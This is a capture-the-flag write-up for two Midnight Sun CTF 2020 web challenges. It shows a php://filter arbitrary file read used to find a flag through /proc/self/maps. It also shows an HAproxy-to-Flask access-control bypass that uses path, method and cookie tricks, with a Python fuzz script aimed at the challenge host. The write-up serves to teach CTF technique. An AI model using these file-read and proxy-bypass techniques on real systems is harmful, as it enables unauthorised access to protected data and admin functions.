# Midnight Sun CTF 2020 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200404-midnightsunctf2020quals/) of this writeup.**


 - [Midnight Sun CTF 2020 Quals](#midnight-sun-ctf-2020-quals)
   - [Web](#web)
     - [hackingforso](#hackingforso)
     - [Shithappens](#shithappens)


---

## Web

### hackingforso

There is an arbitrary file read vulnerability:

`http://hackingforso-01.play.midnightsunctf.se/?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php`

(we can't use `..` and `/xxxx`, but we can use `php://filter`)


When I read the `/proc/self/map`, I found this:

```
562fa83f6000-562fa8e74000 r-xp 00000000 ca:01 269523                     /usr/local/sbin/php-fpm
562fa9074000-562fa9119000 r--p 00a7e000 ca:01 269523                     /usr/local/sbin/php-fpm
562fa9119000-562fa9125000 rw-p 00b23000 ca:01 269523                     /usr/local/sbin/php-fpm
562fa9125000-562fa9134000 rw-p 00000000 00:00 0
562faa1e0000-562faa3ff000 rw-p 00000000 00:00 0                          [heap]
562faa3ff000-562faa403000 rw-p 00000000 00:00 0                          [heap]
7f999efbd000-7f999f1bd000 r-xp 00000000 ca:01 284231                     /var/www/messages/21db4c2051b8e454d73f7b97664770ef.so
7f999f1bd000-7f999f1be000 r--p 00000000 ca:01 284231                     /var/www/messages/21db4c2051b8e454d73f7b97664770ef.so
7f999f1be000-7f999f1bf000 rw-p 00001000 ca:01 284231                     /var/www/messages/21db4c2051b8e454d73f7b97664770ef.so
7f999f1bf000-7f999f3c0000 r-xp 00000000 ca:01 279464                     /usr/local/lib/libmcrypt/ofb.so
7f999f3c0000-7f999f3c1000 r--p 00001000 ca:01 279464                     /usr/local/lib/libmcrypt/ofb.so
7f999f3c1000-7f999f3c2000 rw-p 00002000 ca:01 279464                     /usr/local/lib/libmcrypt/ofb.so
7f999f3c2000-7f999f5c3000 r-xp 00000000 ca:01 279466                     /usr/local/lib/libmcrypt/rc2.so
7f999f5c3000-7f999f5c4000 r--p 00001000 ca:01 279466                     /usr/local/lib/libmcrypt/rc2.so
...
```

The `21db4c2051b8e454d73f7b97664770ef.so` looks like someone's malicious `so` file.

So I tried to download this `so` file, and use `strings` command:

```
$ strings 21db4c2051b8e454d73f7b97664770ef.so

...
./flag_dispenser > /var/www/messages/hurt_me_plentye124f251ac.txt
...
```

OK, let's try to read the `hurt_me_plentye124f251ac.txt`:

`midnight{i_h@t3_cryPt0_1n_w3b_ch4llz}`

WOW, I got the flag :)

### Shithappens

This is a HAproxy bypass challenge. The key here is to exploit the difference between HAproxy and flask.

```
frontend internet_access
  bind *:80
  errorfile 403 /etc/haproxy/errorfiles/403custom.http
  http-response set-header Server Server
  http-request deny if METH_POST
  http-request deny if { path_beg /admin }
  http-request deny if { cook(IMPERSONATE) -m found }
  http-request deny if { hdr_len(Cookie) gt 69 }
  mode http
  use_backend test

backend test
  balance roundrobin
  mode http
  server flaskapp app:8282 resolvers docker_resolver resolve-prefer ipv4
```

1. `path_beg`: request `/%2fadmin` or simply `//admin`
2. `METH_POST`: Just use `HEAD`
3. `hdr_len(Cookie)`: send multiple `Cookie` headers
4. `cook(IMPERSONATE)`: Insert invalid chracter like `IMPERSONATE\x0b`. The backend `flask` will resolve it as `IMPERSONATE`.

Here is the fuzz script for step 4.

```
#!/usr/bin/env python3
import socket
import string
for i in range(128):
    c = chr(i)
    if c in (string.ascii_letters + string.digits):
        continue
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('shithappens-01.play.midnightsunctf.se', 80))
    s.send((f'''
GET //admin HTTP/1.1                                                                                                                     
Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
cooKie: ;IMPERSONATE{c}=admin
Connection: close
''' + '\n').lstrip().replace('\n', '\r\n').encode())
    print(repr(c), s.recv(65536).decode())
    s.close()
```

For the the reason why flask resolves it as `IMPERSONATE`, see [this post](https://www.cnblogs.com/20175211lyz/p/12637624.html) (in Chinese), or check the flask source code.

In this challenge, there is also a debug interface `/debug` which can be useful for debugging the cookies.


